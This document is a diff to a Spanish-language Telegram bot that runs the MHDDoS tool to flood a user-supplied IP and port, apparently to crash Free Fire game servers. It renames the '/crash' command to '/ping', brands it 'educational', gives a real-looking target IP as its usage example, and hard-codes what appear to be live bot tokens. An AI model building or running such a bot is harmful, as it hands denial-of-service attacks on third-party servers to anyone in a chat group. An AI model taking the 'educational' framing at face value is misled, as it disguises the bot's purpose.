@@ -7,9 +7,9 @@ import time
 from threading import Lock, Thread, Timer
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-BOT_TOKEN = "7904854246:AAEDXy29VRzQ8r8O7ul-ea-_nTD0TKb1MjY"
-ADMIN_ID = 6958414459
-GROUP_LINK = "https://t.me/crashgrupo"  # Reemplaza con el enlace de tu grupo
+BOT_TOKEN = "7692852873:AAHQ3YtPu90LarVnzyPRd4695zPDKY8taOQ"
+ADMIN_ID = 6348583777
+GROUP_LINK = "https://t.me/zFerCrashGoup"  # Reemplaza con el enlace de tu grupo
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -84,9 +84,9 @@ def check_shutdown_time():
                     bot.send_message(
                         group_id,
                         "⚠️ *Aviso Importante:*\n\n"
-                        "se apagará en **5 minutos** debido a límites de tiempo.\n"
-                        "Un administrador lo reactivará .\n\n"
-                        "¡! ",
+                        "El bot se apagará en **5 minutos** debido a límites de tiempo.\n"
+                        "Un administrador lo reactivará pronto. Por favor, sean pacientes.\n\n"
+                        "¡Gracias por su comprensión! 🙏",
                         parse_mode="Markdown",
                     )
                 except Exception as e:
@@ -105,15 +105,15 @@ def notify_groups_bot_started():
         try:
             bot.send_message(
                 group_id,
-                "✅ *¡online!*\n\n"
-                "Localizando....\n\n"
-                "¡server listo! ",
+                "✅ *¡El bot ha sido reactivado!*\n\n"
+                "Ya puedes seguir utilizando todos los comandos disponibles.\n\n"
+                "¡Gracias por su paciencia! 💪",
                 parse_mode="Markdown",
             )
         except Exception as e:
             print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")
 
-@bot.message_handler(commands=["startt"])
+@bot.message_handler(commands=["start"])
 def handle_start(message):
     add_user(message.chat.id)  # Asegura que el usuario quede registrado
 
@@ -123,13 +123,13 @@ def handle_start(message):
 
     bot.send_message(
         message.chat.id,
-        " *¡Bienvenido!* \n\n"
+        "🎮 *¡Bienvenido al Bot de Ping MHDDoS!* 🚀\n\n"
         "🔧 Usa `/help` para ver los comandos disponibles.",
         reply_markup=markup,
         parse_mode="Markdown",
     )
 
-@bot.message_handler(commands=["crash"])
+@bot.message_handler(commands=["ping"])
 def handle_ping(message):
     if not is_allowed(message):
         return
@@ -148,9 +148,9 @@ def handle_ping(message):
             (
                 "❌ *Formato inválido!* 🚫\n\n"
                 "📌 *Uso correcto:*\n"
-                "`/crash <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`\n\n"
+                "`/ping <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`\n\n"
                 "💡 *Ejemplo de uso:*\n"
-                "`/crash UDP 143.92.125.230:10013 1 480`"
+                "`/ping UDP 143.92.125.230:10013 1 480`"
             ),
             parse_mode="Markdown",
         )
@@ -179,17 +179,17 @@ def handle_ping(message):
         cooldowns[f"last_command_{telegram_id}"] = message.text  # Guardar el último comando
 
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("🔴 PARAR ATAQUE 🔴", callback_data=f"stop_{telegram_id}"))
+        markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))
 
         bot.reply_to(
             message,
             (
-                "*🔥 ¡Iniciando ataques continuos....! 🔥*\n\n"
-                f"🌐 *server:* {ip_port}\n"
+                "*🔥 ¡Ataque Iniciado! 🔥*\n\n"
+                f"📍 *IP:* {ip_port}\n"
                 f"⚙️ *Tipo:* {attack_type}\n"
                 f"🧵 *Hilos:* {threads}\n"
                 f"⏳ *Duración:* {duration} segundos\n\n"
-                "** 🎮"
+                "*Este bot fue creado por @xFernandoh* 🎮"
             ),
             reply_markup=markup,
             parse_mode="Markdown",
@@ -223,7 +223,7 @@ def handle_stop_attack(call):
             markup.add(InlineKeyboardButton("🔄 Realizar ataque nuevamente", callback_data=f"restart_attack_{telegram_id}"))
 
             bot.edit_message_text(
-                "*[🔴] ATAQUE PARADO [🔴]*\n\n"
+                "*[⛔] *ATAQUE PARADO* [⛔]*\n\n"
                 "¿Quieres realizar el ataque nuevamente? Tienes **20 segundos** para decidir.",
                 chat_id=call.message.chat.id,
                 message_id=call.message.id,
@@ -303,15 +303,15 @@ def handle_restart_attack(call):
             cooldowns[telegram_id] = time.time()  # Actualizar el cooldown
 
             markup = InlineKeyboardMarkup()
-            markup.add(InlineKeyboardButton("🔴 PARAR ATAQUE 🔴", callback_data=f"stop_{telegram_id}"))
+            markup.add(InlineKeyboardButton("⛔ *Parar Ataque* ⛔", callback_data=f"stop_{telegram_id}"))
 
             bot.edit_message_text(
-                "*🔥 ¡Iniciando ataques continuos....! 🔥*\n\n"
-                f"🌐 *server:* {ip_port}\n"
+                "*🔥 ¡Ataque Reiniciado! 🔥*\n\n"
+                f"📍 *IP:* {ip_port}\n"
                 f"⚙️ *Tipo:* {attack_type}\n"
                 f"🧵 *Hilos:* {threads}\n"
                 f"⏳ *Duración:* {duration} segundos\n\n"
-                "** 🎮",
+                "*Este bot fue creado por @xFernandoh* 🎮",
                 chat_id=call.message.chat.id,
                 message_id=call.message.id,
                 reply_markup=markup,
@@ -413,18 +413,18 @@ def handle_help(message):
     bot.send_message(
         message.chat.id,
         (
-            "🔧 *¿Cómo usar?* 🤖\n\n"
-            ".\n\n"
+            "🔧 *¿Cómo usar este bot?* 🤖\n\n"
+            "Este bot está diseñado para ayudarte a ejecutar ataques de prueba con fines educativos en Free Fire.\n\n"
             "*Comandos disponibles:*\n"
-            "1. `/startt`: Inicia el bot y te da una breve introducción.\n"
-            "2. `/crash <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`: Inicia.\n"
+            "1. `/start`: Inicia el bot y te da una breve introducción.\n"
+            "2. `/ping <TIPO> <IP/HOST:PUERTO> <HILOS> <MS>`: Inicia un ataque de ping.\n"
             "3. `/addgroup <ID del grupo>`: Agrega un grupo a la lista de grupos permitidos (solo admin).\n"
             "4. `/removegroup <ID del grupo>`: Elimina un grupo de la lista de grupos permitidos (solo admin).\n"
             "5. `/help`: Muestra esta ayuda.\n"
             "6. `/timeactive`: Muestra el tiempo activo del bot y el tiempo restante antes de que se cierre.\n"
             "7. `/broadcast <mensaje>`: Envía un mensaje a todos los usuarios registrados (solo admin).\n"
             "8. `/broadcastgroup <mensaje>`: Envía un mensaje a todos los grupos autorizados (solo admin).\n\n"
-            "¡son todas las funciones por ahora! 🎮"
+            "¡Juega con responsabilidad y diviértete! 🎮"
         ),
         parse_mode="Markdown",
     )
@@ -446,10 +446,10 @@ def handle_timeactive(message):
     bot.reply_to(
         message,
         (
-            f"🕒 *TIEMPOACTIVO:*\n"
-            f"✅ *TIEMPO TRANSCURRIDO:* {elapsed_minutes}m {elapsed_seconds}s\n"
-            f"⚠️ *TIEMPORESTANTE:* {remaining_minutes}m {remaining_seconds}s\n\n"
-            "➡️ *Recuerda que se cierra automáticamente después de 140 minutos.*"
+            f"🕒 *Tiempo activo del bot:*\n"
+            f"✅ *Tiempo transcurrido:* {elapsed_minutes}m {elapsed_seconds}s\n"
+            f"⚠️ *Tiempo restante:* {remaining_minutes}m {remaining_seconds}s\n\n"
+            "🚀 *Recuerda que Codespaces se cierra automáticamente después de 140 minutos.*"
         ),
         parse_mode="Markdown"
     )
